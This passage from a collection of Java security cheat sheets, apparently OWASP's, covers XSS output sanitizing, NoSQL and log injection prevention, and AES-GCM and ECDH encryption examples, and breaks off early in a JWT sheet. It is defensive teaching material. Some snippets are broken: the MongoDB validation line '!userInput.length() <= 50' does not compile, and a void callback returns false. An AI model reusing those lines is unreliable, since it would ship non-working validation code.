'<strong>'*/\r\nPolicyFactory policy = new HtmlPolicyBuilder().allowElements(\"p\", \"strong\").toFactory();\r\n\r\n/* Sanitize the output that will be sent to user*/\r\nString safeOutput = policy.sanitize(outputToUser);\r\n\r\n/* Encode HTML Tag*/\r\nsafeOutput = Encode.forHtml(safeOutput);\r\nString finalSafeOutputExpected = \"You <p>user login</p> is <strong>owasp-user01</strong>\";\r\nif (!finalSafeOutputExpected.equals(safeOutput))\r\n{\r\n    return false;\r\n}\r\n```\r\n\r\n#### References\r\n\r\n- [XSS](https://owasp.org/www-community/attacks/xss/)\r\n- [OWASP Java HTML Sanitizer](https://github.com/owasp/java-html-sanitizer)\r\n- [OWASP Java Encoder](https://github.com/owasp/owasp-java-encoder)\r\n- [Java RegEx](https://docs.oracle.com/javase/8/docs/api/java/util/regex/Pattern.html)\r\n\r\n### LDAP\r\n\r\nA dedicated [cheatsheet](LDAP_Injection_Prevention_Cheat_Sheet.md) has been created.\r\n\r\n### NoSQL\r\n\r\n#### Symptom\r\n\r\nInjection of this type occur when the application uses untrusted user input to build a NoSQL API call expression.\r\n\r\n#### How to prevent\r\n\r\nAs there many NoSQL database system and each one use an API for call, it's important to ensure that user input received and used to build the API call expression does not contain any character that have a special meaning in the target API syntax. This in order to avoid that it will be used to escape the initial call expression in order to create another one based on crafted user input. It's also important to not use string concatenation to build API call expression but use the API to create the expression.\r\n\r\n#### Example - MongoDB\r\n\r\n``` java\r\n /* Here use MongoDB as target NoSQL DB */\r\nString userInput = \"Brooklyn\";\r\n\r\n/* First ensure that the input do no contains any special characters\r\nfor the current NoSQL DB call API,\r\nhere they are: ' \" \\ ; { } $\r\n*/\r\n//Avoid regexp this time in order to made validation code\r\n//more easy to read and understand...\r\nArrayList < String > specialCharsList = new ArrayList < String > () {\r\n    {\r\n        add(\"'\");\r\n        add(\"\\\"\");\r\n        add(\"\\\\\");\r\n        add(\";\");\r\n        add(\"{\");\r\n        add(\"}\");\r\n        add(\"$\");\r\n    }\r\n};\r\n\r\nfor (String specChar: specialCharsList) {\r\n    if (userInput.contains(specChar)) {\r\n        return false;\r\n    }\r\n}\r\n   \r\n//Add also a check on input max size\r\nif (!userInput.length() <= 50)\r\n{\r\n    return false;\r\n}\r\n\r\n/* Then perform query on database using API to build expression */\r\n//Connect to the local MongoDB instance\r\ntry(MongoClient mongoClient = new MongoClient()){\r\n    MongoDatabase db = mongoClient.getDatabase(\"test\");\r\n    //Use API query builder to create call expression\r\n    //Create expression\r\n    Bson expression = eq(\"borough\", userInput);\r\n    //Perform call\r\n    FindIterable<org.bson.Document> restaurants = db.getCollection(\"restaurants\").find(expression);\r\n    //Verify result consistency\r\n    restaurants.forEach(new Block<org.bson.Document>() {\r\n        @Override\r\n        public void apply(final org.bson.Document doc) {\r\n            String restBorough = (String)doc.get(\"borough\");\r\n            if (!\"Brooklyn\".equals(restBorough))\r\n            {\r\n                return false;\r\n            }\r\n        }\r\n    });\r\n}\r\n```\r\n\r\n#### References\r\n\r\n- [Testing for NoSQL injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.html)\r\n- [SQL and NoSQL Injection](https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_sql_and_nosql_injection.html)\r\n- [No SQL, No Injection?](https://arxiv.org/ftp/arxiv/papers/1506/1506.04082.pdf)\r\n\r\n### Log Injection\r\n\r\n#### Symptom\r\n\r\n[Log Injection](https://owasp.org/www-community/attacks/Log_Injection) occurs when an application includes untrusted data in an application log message (e.g., an attacker can cause an additional log entry that looks like it came from a completely different user, if they can inject CRLF characters in the untrusted data). More information about this attack is available on the OWASP [Log Injection](https://owasp.org/www-community/attacks/Log_Injection) page.\r\n\r\n#### How to prevent\r\n\r\nTo prevent an attacker from writing malicious content into the application log, apply defenses such as:\r\n\r\n- Filter the user input used to prevent injection of **C**arriage **R**eturn (CR) or **L**ine **F**eed (LF) characters.\r\n- Limit the size of the user input value used to create the log message.\r\n- Make sure [all XSS defenses](Cross_Site_Scripting_Prevention_Cheat_Sheet.md) are applied when viewing log files in a web browser.\r\n\r\n#### Example using Log4j2\r\n\r\nConfiguration of a logging policy to roll on 10 files of 5MB each, and encode/limit the log message using the [Pattern *encode{}{CRLF}*](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout\\%7CLog4j2), introduced in [Log4j2 v2.10.0](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api), and the *-500m* message size limit.:\r\n\r\n``` xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<Configuration status=\"error\" name=\"SecureLoggingPolicy\">\r\n    <Appenders>\r\n        <RollingFile name=\"RollingFile\" fileName=\"App.log\" filePattern=\"App-%i.log\" ignoreExceptions=\"false\">\r\n            <PatternLayout>\r\n                <!-- Encode any CRLF chars in the message and limit its\r\n                     maximum size to 500 characters -->\r\n                <Pattern>%d{ISO8601} %-5p - %encode{ %.-500m }{CRLF}%n</Pattern>\r\n            </PatternLayout>\r\n            <Policies>\r\n                <SizeBasedTriggeringPolicy size=\"5MB\"/>\r\n            </Policies>\r\n            <DefaultRolloverStrategy max=\"10\"/>\r\n        </RollingFile>\r\n    </Appenders>\r\n    <Loggers>\r\n        <Root level=\"debug\">\r\n            <AppenderRef ref=\"RollingFile\"/>\r\n        </Root>\r\n    </Loggers>\r\n</Configuration>\r\n```\r\n\r\nUsage of the logger at code level:\r\n\r\n``` java\r\nimport org.apache.logging.log4j.LogManager;\r\nimport org.apache.logging.log4j.Logger;\r\n...\r\n// No special action needed because security actions are\r\n// performed at the logging policy level\r\nLogger logger = LogManager.getLogger(MyClass.class);\r\nlogger.info(logMessage);\r\n...\r\n```\r\n\r\n#### Example using Logback with the OWASP Security Logging library\r\n\r\nConfiguration of a logging policy to roll on 10 files of 5MB each, and encode/limit the log message using the [CRLFConverter](https://github.com/augustd/owasp-security-logging/wiki/Log-Forging), provided by the **no longer active** [OWASP Security Logging Project](https://github.com/augustd/owasp-security-logging/wiki), and the *-500msg* message size limit:\r\n\r\n``` xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<configuration>\r\n    <!-- Define the CRLFConverter -->\r\n    <conversionRule conversionWord=\"crlf\" converterClass=\"org.owasp.security.logging.mask.CRLFConverter\" />\r\n    <appender name=\"RollingFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\r\n        <file>App.log</file>\r\n        <rollingPolicy class=\"ch.qos.logback.core.rolling.FixedWindowRollingPolicy\">\r\n            <fileNamePattern>App-%i.log</fileNamePattern>\r\n            <minIndex>1</minIndex>\r\n            <maxIndex>10</maxIndex>\r\n        </rollingPolicy>\r\n        <triggeringPolicy class=\"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy\">\r\n            <maxFileSize>5MB</maxFileSize>\r\n        </triggeringPolicy>\r\n        <encoder>\r\n            <!-- Encode any CRLF chars in the message and limit\r\n                 its maximum size to 500 characters -->\r\n            <pattern>%relative [%thread] %-5level %logger{35} - %crlf(%.-500msg) %n</pattern>\r\n        </encoder>\r\n    </appender>\r\n    <root level=\"debug\">\r\n        <appender-ref ref=\"RollingFile\" />\r\n    </root>\r\n</configuration>\r\n```\r\n\r\nYou also have to add the [OWASP Security Logging](https://github.com/augustd/owasp-security-logging/wiki/Usage-with-Logback) dependency to your project.\r\n\r\nUsage of the logger at code level:\r\n\r\n``` java\r\nimport org.slf4j.Logger;\r\nimport org.slf4j.LoggerFactory;\r\n...\r\n// No special action needed because security actions\r\n// are performed at the logging policy level\r\nLogger logger = LoggerFactory.getLogger(MyClass.class);\r\nlogger.info(logMessage);\r\n...\r\n```\r\n\r\n#### References\r\n\r\n- [PatternLayout](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) (See the `encode{}{CRLF}` function)\r\n\r\n```text\r\nNote that the default Log4j2 encode{} encoder is HTML, which does NOT prevent log injection.\r\n\r\nIt prevents XSS attacks against viewing logs using a browser.\r\n\r\nOWASP recommends defending against XSS attacks in such situations in the log viewer application itself,\r\nnot by preencoding all the log messages with HTML encoding as such log entries may be used/viewed in many\r\nother log viewing/analysis tools that don't expect the log data to be pre-HTML encoded.\r\n```\r\n\r\n- [LOG4J Configuration](https://logging.apache.org/log4j/2.x/manual/configuration.html)\r\n- [LOG4J Appender](https://logging.apache.org/log4j/2.x/manual/appenders.html)\r\n- [Log Forging](https://github.com/javabeanz/owasp-security-logging/wiki/Log-Forging) - See the Logback section about the `CRLFConverter` this library provides.\r\n- [Usage of OWASP Security Logging with Logback](https://github.com/javabeanz/owasp-security-logging/wiki/Usage-with-Logback)\r\n\r\n## Cryptography\r\n\r\n### General cryptography guidance\r\n\r\n- **Never, ever write your own cryptographic functions.**\r\n- Wherever possible, try and avoid writing any cryptographic code at all. Instead try and either use pre-existing secret management solutions or the secret management solution provided by your cloud provider. For more information, see the [OWASP Secrets Management Cheat Sheet](Secrets_Management_Cheat_Sheet.md).\r\n- If you cannot use a pre-existing secret management solution, try and use a trusted and well known implementation library rather than using the libraries built into JCA/JCE as it is far too easy to make cryptographic errors with them.\r\n- Make sure your application or protocol can easily support a future change of cryptographic algorithms.\r\n- Use your package manager wherever possible to keep all of your packages up to date. Watch the updates on your development setup, and plan updates to your applications accordingly.\r\n- We will show examples below based on Google Tink, which is a library created by cryptography experts for using cryptography safely (in the sense of minimizing common mistakes made when using standard cryptography libraries).\r\n\r\n### Encryption for storage\r\n\r\nFollow the algorithm guidance in the [OWASP Cryptographic Storage Cheat Sheet](Cryptographic_Storage_Cheat_Sheet.m#algorithms).\r\n\r\n#### Symmetric example using Google Tink\r\n\r\nGoogle Tink has documentation on performing common tasks.\r\n\r\nFor example, this page (from Google's website) shows [how to perform simple symmetric encryption](https://developers.google.com/tink/encrypt-data).\r\n\r\nThe following code snippet shows an encapsulated use of this functionality:\r\n\r\n<details>\r\n  <summary>Click here to view the \"Tink symmetric encryption\" code snippet.</summary>\r\n\r\n``` java\r\nimport static java.nio.charset.StandardCharsets.UTF_8;\r\n\r\nimport com.google.crypto.tink.Aead;\r\nimport com.google.crypto.tink.InsecureSecretKeyAccess;\r\nimport com.google.crypto.tink.KeysetHandle;\r\nimport com.google.crypto.tink.TinkJsonProtoKeysetFormat;\r\nimport com.google.crypto.tink.aead.AeadConfig;\r\nimport java.nio.file.Files;\r\nimport java.nio.file.Path;\r\nimport java.nio.file.Paths;\r\nimport java.util.Base64;\r\n\r\n// AesGcmSimpleTest\r\npublic class App {\r\n\r\n    // Based on example from:\r\n    // https://github.com/tink-crypto/tink-java/tree/main/examples/aead\r\n\r\n    public static void main(String[] args) throws Exception {\r\n        \r\n        // Key securely generated using:\r\n        // tinkey create-keyset --key-template AES128_GCM --out-format JSON --out aead_test_keyset.json\r\n          \r\n          \r\n          \r\n        // Register all AEAD key types with the Tink runtime.\r\n        AeadConfig.register();\r\n      \r\n        // Read the keyset into a KeysetHandle.\r\n        KeysetHandle handle =\r\n        TinkJsonProtoKeysetFormat.parseKeyset(\r\n            new String(Files.readAllBytes( Paths.get(\"/home/fredbloggs/aead_test_keyset.json\")), UTF_8), InsecureSecretKeyAccess.get());\r\n\r\n        String message = \"This message to be encrypted\";\r\n        System.out.println(message);\r\n\r\n        // Add some relevant context about the encrypted data that should be verified\r\n        // on decryption\r\n        String metadata = \"Sender: fredbloggs@example.com\";\r\n\r\n        // Encrypt the message\r\n        byte[] cipherText = AesGcmSimple.encrypt(message, metadata, handle);\r\n        System.out.println(Base64.getEncoder().encodeToString(cipherText));\r\n\r\n        // Decrypt the message\r\n        String message2 = AesGcmSimple.decrypt(cipherText, metadata, handle);\r\n        System.out.println(message2);\r\n    }\r\n}\r\n\r\nclass AesGcmSimple {\r\n\r\n    public static byte[] encrypt(String plaintext, String metadata, KeysetHandle handle) throws Exception {\r\n        // Get the primitive.\r\n        Aead aead = handle.getPrimitive(Aead.class);\r\n        return aead.encrypt(plaintext.getBytes(UTF_8), metadata.getBytes(UTF_8));\r\n    }\r\n\r\n    public static String decrypt(byte[] ciphertext, String metadata, KeysetHandle handle) throws Exception {\r\n        // Get the primitive.\r\n        Aead aead = handle.getPrimitive(Aead.class);\r\n        return new String(aead.decrypt(ciphertext, metadata.getBytes(UTF_8)),UTF_8);\r\n    }\r\n\r\n}\r\n\r\n```\r\n\r\n</details>\r\n\r\n#### Symmetric example using built-in JCA/JCE classes\r\n\r\nIf you absolutely cannot use a separate library, it is still possible to use the built JCA/JCE classes but it is strongly recommended to have a cryptography expert review the full design and code, as even the most trivial error can severely weaken your encryption.\r\n\r\nThe following code snippet shows an example of using AES-GCM to perform encryption/decryption of data.\r\n\r\nA few constraints/pitfalls with this code:\r\n\r\n- It does not take into account key rotation or management which is a whole topic in itself.\r\n- It is important to use a different nonce for every encryption operation, especially if the same key is used. For more information, see [this answer on Cryptography Stack Exchange](https://crypto.stackexchange.com/a/66500).\r\n- The key will need to be stored securely.\r\n\r\n<details>\r\n  <summary>Click here to view the \"JCA/JCE symmetric encryption\" code snippet.</summary>\r\n\r\n```java\r\nimport java.nio.charset.StandardCharsets;\r\nimport java.security.SecureRandom;\r\nimport javax.crypto.spec.*;\r\nimport javax.crypto.*;\r\nimport java.util.Base64;\r\n\r\n\r\n// AesGcmSimpleTest\r\nclass Main {\r\n\r\n    public static void main(String[] args) throws Exception {\r\n        // Key of 32 bytes / 256 bits for AES\r\n        KeyGenerator keyGen = KeyGenerator.getInstance(AesGcmSimple.ALGORITHM);\r\n        keyGen.init(AesGcmSimple.KEY_SIZE, new SecureRandom());\r\n        SecretKey secretKey = keyGen.generateKey();\r\n\r\n        // Nonce of 12 bytes / 96 bits and this size should always be used.\r\n        // It is critical for AES-GCM that a unique nonce is used for every cryptographic operation.\r\n        byte[] nonce = new byte[AesGcmSimple.IV_LENGTH];\r\n        SecureRandom random = new SecureRandom();\r\n        random.nextBytes(nonce);\r\n\r\n        var message = \"This message to be encrypted\";\r\n        System.out.println(message);\r\n\r\n        // Encrypt the message\r\n        byte[] cipherText = AesGcmSimple.encrypt(message, nonce, secretKey);\r\n        System.out.println(Base64.getEncoder().encodeToString(cipherText));\r\n\r\n        // Decrypt the message\r\n        var message2 = AesGcmSimple.decrypt(cipherText, nonce, secretKey);\r\n        System.out.println(message2);\r\n    }\r\n}\r\n\r\nclass AesGcmSimple {\r\n\r\n    public static final String ALGORITHM = \"AES\";\r\n    public static final String CIPHER_ALGORITHM = \"AES/GCM/NoPadding\";\r\n    public static final int KEY_SIZE = 256;\r\n    public static final int TAG_LENGTH = 128;\r\n    public static final int IV_LENGTH = 12;\r\n\r\n    public static byte[] encrypt(String plaintext, byte[] nonce, SecretKey secretKey) throws Exception {\r\n        return cryptoOperation(plaintext.getBytes(StandardCharsets.UTF_8), nonce, secretKey, Cipher.ENCRYPT_MODE);\r\n    }\r\n\r\n    public static String decrypt(byte[] ciphertext, byte[] nonce, SecretKey secretKey) throws Exception {\r\n        return new String(cryptoOperation(ciphertext, nonce, secretKey, Cipher.DECRYPT_MODE), StandardCharsets.UTF_8);\r\n    }\r\n\r\n    private static byte[] cryptoOperation(byte[] text, byte[] nonce, SecretKey secretKey, int mode) throws Exception {\r\n        Cipher cipher = Cipher.getInstance(CIPHER_ALGORITHM);\r\n        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(TAG_LENGTH, nonce);\r\n        cipher.init(mode, secretKey, gcmParameterSpec);\r\n        return cipher.doFinal(text);\r\n    }\r\n\r\n}\r\n```\r\n\r\n</details>\r\n\r\n### Encryption for transmission\r\n\r\nAgain, follow the algorithm guidance in the [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#algorithms).\r\n\r\n#### Asymmetric example using Google Tink\r\n\r\nGoogle Tink has documentation on performing common tasks.\r\n\r\nFor example, this page (from Google's website) shows [how to perform a hybrid encryption process](https://developers.google.com/tink/exchange-data) where two parties want to share data based on their asymmetric key pair.\r\n\r\nThe following code snippet shows how this functionality can be used to share secrets between Alice and Bob:\r\n\r\n<details>\r\n  <summary>Click here to view the \"Tink hybrid encryption\" code snippet.</summary>\r\n\r\n``` java\r\nimport static java.nio.charset.StandardCharsets.UTF_8;\r\n\r\nimport com.google.crypto.tink.HybridDecrypt;\r\nimport com.google.crypto.tink.HybridEncrypt;\r\nimport com.google.crypto.tink.InsecureSecretKeyAccess;\r\nimport com.google.crypto.tink.KeysetHandle;\r\nimport com.google.crypto.tink.TinkJsonProtoKeysetFormat;\r\nimport com.google.crypto.tink.hybrid.HybridConfig;\r\nimport java.nio.file.Files;\r\nimport java.nio.file.Path;\r\nimport java.nio.file.Paths;\r\nimport java.util.Base64;\r\n\r\n// HybridReplaceTest\r\nclass App {\r\n    public static void main(String[] args) throws Exception {\r\n        /*\r\n\r\n        Generated public/private keypairs for Bob and Alice using the\r\n        following tinkey commands:\r\n\r\n        ./tinkey create-keyset \\\r\n        --key-template DHKEM_X25519_HKDF_SHA256_HKDF_SHA256_AES_256_GCM \\\r\n        --out-format JSON --out alice_private_keyset.json\r\n\r\n        ./tinkey create-keyset \\\r\n        --key-template DHKEM_X25519_HKDF_SHA256_HKDF_SHA256_AES_256_GCM \\\r\n        --out-format JSON --out bob_private_keyset.json\r\n\r\n        ./tinkey create-public-keyset --in alice_private_keyset.json \\\r\n        --in-format JSON --out-format JSON --out alice_public_keyset.json\r\n\r\n        ./tinkey create-public-keyset --in bob_private_keyset.json \\\r\n        --in-format JSON --out-format JSON --out bob_public_keyset.json\r\n        */\r\n\r\n        HybridConfig.register();\r\n\r\n        // Generate ECC key pair for Alice\r\n        var alice = new HybridSimple(\r\n                getKeysetHandle(\"/home/alicesmith/private_keyset.json\"),\r\n                getKeysetHandle(\"/home/alicesmith/public_keyset.json\")\r\n\r\n        );\r\n\r\n        KeysetHandle alicePublicKey = alice.getPublicKey();\r\n\r\n        // Generate ECC key pair for Bob\r\n        var bob = new HybridSimple(\r\n                getKeysetHandle(\"/home/bobjones/private_keyset.json\"),\r\n                getKeysetHandle(\"/home/bobjones/public_keyset.json\")\r\n\r\n        );\r\n\r\n        KeysetHandle bobPublicKey = bob.getPublicKey();\r\n\r\n        // This keypair generation should be reperformed every so often in order to\r\n        // obtain a new shared secret to avoid a long lived shared secret.\r\n\r\n        // Alice encrypts a message to send to Bob\r\n        String plaintext = \"Hello, Bob!\";\r\n        \r\n        // Add some relevant context about the encrypted data that should be verified\r\n        // on decryption\r\n        String metadata = \"Sender: alicesmith@example.com\";\r\n\r\n        System.out.println(\"Secret being sent from Alice to Bob: \" + plaintext);\r\n        var cipherText = alice.encrypt(bobPublicKey, plaintext, metadata);\r\n        System.out.println(\"Ciphertext being sent from Alice to Bob: \" + Base64.getEncoder().encodeToString(cipherText));\r\n\r\n\r\n        // Bob decrypts the message\r\n        var decrypted = bob.decrypt(cipherText, metadata);\r\n        System.out.println(\"Secret received by Bob from Alice: \" + decrypted);\r\n        System.out.println();\r\n\r\n        // Bob encrypts a message to send to Alice\r\n        String plaintext2 = \"Hello, Alice!\";\r\n\r\n        // Add some relevant context about the encrypted data that should be verified\r\n        // on decryption\r\n        String metadata2 = \"Sender: bobjones@example.com\";\r\n\r\n        System.out.println(\"Secret being sent from Bob to Alice: \" + plaintext2);\r\n        var cipherText2 = bob.encrypt(alicePublicKey, plaintext2, metadata2);\r\n        System.out.println(\"Ciphertext being sent from Bob to Alice: \" + Base64.getEncoder().encodeToString(cipherText2));\r\n\r\n        // Bob decrypts the message\r\n        var decrypted2 = alice.decrypt(cipherText2, metadata2);\r\n        System.out.println(\"Secret received by Alice from Bob: \" + decrypted2);\r\n    }\r\n\r\n    private static KeysetHandle getKeysetHandle(String filename) throws Exception\r\n    {\r\n        return TinkJsonProtoKeysetFormat.parseKeyset(\r\n                new String(Files.readAllBytes( Paths.get(filename)), UTF_8), InsecureSecretKeyAccess.get());\r\n    }\r\n}\r\nclass HybridSimple {\r\n\r\n    private KeysetHandle privateKey;\r\n    private KeysetHandle publicKey;\r\n\r\n\r\n    public HybridSimple(KeysetHandle privateKeyIn, KeysetHandle publicKeyIn) throws Exception {\r\n        privateKey = privateKeyIn;\r\n        publicKey = publicKeyIn;\r\n    }\r\n\r\n    public KeysetHandle getPublicKey() {\r\n        return publicKey;\r\n    }\r\n\r\n    public byte[] encrypt(KeysetHandle partnerPublicKey, String message, String metadata) throws Exception {\r\n\r\n        HybridEncrypt encryptor = partnerPublicKey.getPrimitive(HybridEncrypt.class);\r\n\r\n        // return the encrypted value\r\n        return encryptor.encrypt(message.getBytes(UTF_8), metadata.getBytes(UTF_8));\r\n    }\r\n    public String decrypt(byte[] ciphertext, String metadata) throws Exception {\r\n\r\n        HybridDecrypt decryptor = privateKey.getPrimitive(HybridDecrypt.class);\r\n\r\n        // return the encrypted value\r\n        return new String(decryptor.decrypt(ciphertext, metadata.getBytes(UTF_8)),UTF_8);\r\n    }\r\n\r\n\r\n}\r\n```\r\n\r\n</details>\r\n\r\n#### Asymmetric example using built-in JCA/JCE classes\r\n\r\nIf you absolutely cannot use a separate library, it is still possible to use the built JCA/JCE classes but it is strongly recommended to have a cryptography expert review the full design and code, as even the most trivial error can severely weaken your encryption.\r\n\r\nThe following code snippet shows an example of using Eliptic Curve/Diffie Helman (ECDH) together with AES-GCM to perform encryption/decryption of data between two different sides without the need the transfer the symmetric key between the two sides. Instead, the sides exchange public keys and can then use ECDH to generate a shared secret which can be used for the symmetric encryption.\r\n\r\nNote that this code sample relies on the AesGcmSimple class from the [previous section](#symmetric-example-using-built-in-jcajce-classes).\r\n\r\nA few constraints/pitfalls with this code:\r\n\r\n- It does not take into account key rotation or management which is a whole topic in itself.\r\n- The code deliberately enforces a new nonce for every encryption operation but this must be managed as a separate data item alongside the ciphertext.\r\n- The private keys will need to be stored securely.\r\n- The code does not consider the validation of public keys before use.\r\n- Overall, there is no verification of authenticity between the two sides.\r\n\r\n<details>\r\n  <summary>Click here to view the \"JCA/JCE hybrid encryption\" code snippet.</summary>\r\n\r\n```java\r\nimport java.nio.charset.StandardCharsets;\r\nimport java.security.SecureRandom;\r\nimport javax.crypto.spec.*;\r\nimport javax.crypto.*;\r\nimport java.util.*;\r\nimport java.security.*;\r\nimport java.security.spec.*;\r\nimport java.util.Arrays;\r\n\r\n// ECDHSimpleTest\r\nclass Main {\r\n    public static void main(String[] args) throws Exception {\r\n\r\n        // Generate ECC key pair for Alice\r\n        var alice = new ECDHSimple();\r\n        Key alicePublicKey = alice.getPublicKey();\r\n\r\n        // Generate ECC key pair for Bob\r\n        var bob = new ECDHSimple();\r\n        Key bobPublicKey = bob.getPublicKey();\r\n\r\n        // This keypair generation should be reperformed every so often in order to \r\n        // obtain a new shared secret to avoid a long lived shared secret.\r\n\r\n        // Alice encrypts a message to send to Bob\r\n        String plaintext = \"Hello\"; //, Bob!\";\r\n        System.out.println(\"Secret being sent from Alice to Bob: \" + plaintext);\r\n        \r\n        var retPair = alice.encrypt(bobPublicKey, plaintext);\r\n        var nonce = retPair.getKey();\r\n        var cipherText = retPair.getValue();\r\n        \r\n        System.out.println(\"Both cipherText and nonce being sent from Alice to Bob: \" + Base64.getEncoder().encodeToString(cipherText) + \" \" + Base64.getEncoder().encodeToString(nonce));\r\n\r\n\r\n        // Bob decrypts the message\r\n        var decrypted = bob.decrypt(alicePublicKey, cipherText, nonce);\r\n        System.out.println(\"Secret received by Bob from Alice: \" + decrypted);\r\n        System.out.println();\r\n\r\n        // Bob encrypts a message to send to Alice\r\n        String plaintext2 = \"Hello\"; //, Alice!\";\r\n        System.out.println(\"Secret being sent from Bob to Alice: \" + plaintext2);\r\n        \r\n        var retPair2 = bob.encrypt(alicePublicKey, plaintext2);\r\n        var nonce2 = retPair2.getKey();\r\n        var cipherText2 = retPair2.getValue();\r\n        System.out.println(\"Both cipherText2 and nonce2 being sent from Bob to Alice: \" + Base64.getEncoder().encodeToString(cipherText2) + \" \" + Base64.getEncoder().encodeToString(nonce2));\r\n\r\n        // Bob decrypts the message\r\n        var decrypted2 = alice.decrypt(bobPublicKey, cipherText2, nonce2);\r\n        System.out.println(\"Secret received by Alice from Bob: \" + decrypted2);\r\n    }\r\n}\r\nclass ECDHSimple {\r\n    private KeyPair keyPair;\r\n\r\n    public class AesKeyNonce {\r\n        public SecretKey Key;\r\n        public byte[] Nonce;\r\n    }\r\n\r\n    public ECDHSimple() throws Exception {\r\n        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"EC\");\r\n        ECGenParameterSpec ecSpec = new ECGenParameterSpec(\"secp256r1\"); // Using secp256r1 curve\r\n        keyPairGenerator.initialize(ecSpec);\r\n        keyPair = keyPairGenerator.generateKeyPair();\r\n    }\r\n\r\n    public Key getPublicKey() {\r\n        return keyPair.getPublic();\r\n    }\r\n\r\n    public AbstractMap.SimpleEntry<byte[], byte[]> encrypt(Key partnerPublicKey, String message) throws Exception {\r\n\r\n        // Generate the AES Key and Nonce\r\n        AesKeyNonce aesParams = generateAESParams(partnerPublicKey);\r\n\r\n        // return the encrypted value\r\n        return new AbstractMap.SimpleEntry<>(\r\n            aesParams.Nonce,\r\n            AesGcmSimple.encrypt(message, aesParams.Nonce, aesParams.Key)\r\n            );\r\n    }\r\n    public String decrypt(Key partnerPublicKey, byte[] ciphertext, byte[] nonce) throws Exception {\r\n\r\n        // Generate the AES Key and Nonce\r\n        AesKeyNonce aesParams = generateAESParams(partnerPublicKey, nonce);\r\n\r\n        // return the decrypted value\r\n        return AesGcmSimple.decrypt(ciphertext, aesParams.Nonce, aesParams.Key);\r\n    }\r\n\r\n    private AesKeyNonce generateAESParams(Key partnerPublicKey, byte[] nonce) throws Exception {\r\n    \r\n        // Derive the secret based on this side's private key and the other side's public key \r\n        KeyAgreement keyAgreement = KeyAgreement.getInstance(\"ECDH\");\r\n        keyAgreement.init(keyPair.getPrivate());\r\n        keyAgreement.doPhase(partnerPublicKey, true);\r\n        byte[] secret = keyAgreement.generateSecret();\r\n\r\n        AesKeyNonce aesKeyNonce = new AesKeyNonce();\r\n\r\n        // Copy first 32 bytes as the key\r\n        byte[] key = Arrays.copyOfRange(secret, 0, (AesGcmSimple.KEY_SIZE / 8));\r\n        aesKeyNonce.Key = new SecretKeySpec(key, 0, key.length, \"AES\");\r\n        \r\n        // Passed in nonce will be used.\r\n        aesKeyNonce.Nonce = nonce;\r\n        return aesKeyNonce;\r\n        \r\n    }\r\n\r\n    private AesKeyNonce generateAESParams(Key partnerPublicKey) throws Exception {\r\n    \r\n        // Nonce of 12 bytes / 96 bits and this size should always be used.\r\n        // It is critical for AES-GCM that a unique nonce is used for every cryptographic operation.\r\n        // Therefore this is not generated from the shared secret\r\n        byte[] nonce = new byte[AesGcmSimple.IV_LENGTH];\r\n        SecureRandom random = new SecureRandom();\r\n        random.nextBytes(nonce);\r\n        return generateAESParams(partnerPublicKey, nonce);\r\n\r\n    }\r\n}\r\n```\r\n\r\n</details>\r\n"
    },
    {
      "JSON_Web_Token_for_Java_Cheat_Sheet.md": "# JSON Web Token Cheat Sheet for Java\r\n\r\n## Introduction\r\n\r\nMany applications use **JSON Web Tokens** (JWT) to allow the client to indicate its identity for further exchange after authentication.\r\n\r\nFrom [JWT.IO](https://jwt.io/introduction):\r\n\r\n> JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA.\r\n\r\nJSON Web Token is used to carry information related to the identity and characteristics (claims) of a client. This information is signed by the server in order for it to detect whether it was tampered with after sending it to the client. This will prevent an attacker from changing the identity or any characteristics (for example, changing the role from simple user to admin or change the client login).\r\n\r\nThis token is created during authentication (is provided in case of successful authentication) and is verified by the server before any processing. It is used by an application to allow a client to present a token representing the user's \"identity card\" to the server and allow the server to verify the validity and integrity of the token in a secure way, all of this in a stateless and portable approach (portable in the way that client and server technologies can be different including also the transport channel even if HTTP is the most often used).\r\n\r\n## Token Structure\r\n\r\nToken structure example taken from [JWT.IO](https://jwt.io/#debugger):\r\n\r\n`[Base64(HEADER)].[Base64(PAYLOAD)].[Base64(SIGNATURE)]`\r\n\r\n```text\r\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\r\neyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.\r\nTJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\r\n```\r\n\r\nChunk 1: **Header**\r\n\r\n```json\r\n{\r\n  \"alg\": \"HS256\",\r\n  \"typ\": \"JWT\"\r\n}\r\n```\r\n\r\nChunk 2: **Payload**\r\n\r\n```json\r\n{\r\n  \"sub\": \"1234567890\",\r\n  \"name\": \"John Doe\",\r\n  \"admin\": true\r\n}\r\n```\r\n\r\nChunk 3: **Signature**\r\n\r\n```javascript\r\nHMACSHA256( base64UrlEncode(header) + \".\" + base64UrlEncode(payload), KEY )\r\n```\r\n\r\n## Objective\r\n\r\nThis cheatsheet provides tips to prevent common security issues when using JSON Web Tokens (JWT) with Java.\r\n\r\nThe tips presented in this article are part of a Java project that was created to show the correct way to handle creation and validation of JSON Web Tokens.\r\n\r\nYou can find the Java project [here](https://github.com/righettod/poc-jwt), it uses the official [JWT library](https://jwt.io/#libraries).\r\n\r\nIn the rest of the article, the term **token** refers to the **JSON Web Tokens** (JWT).\r\n\r\n## Consideration about Using JWT\r\n\r\nEven if a JWT token is \"easy\" to use and allow to expose services (mostly REST style) in a stateless way, it's not the solution that fits for all applications because it comes with some caveats, like for example the question of the 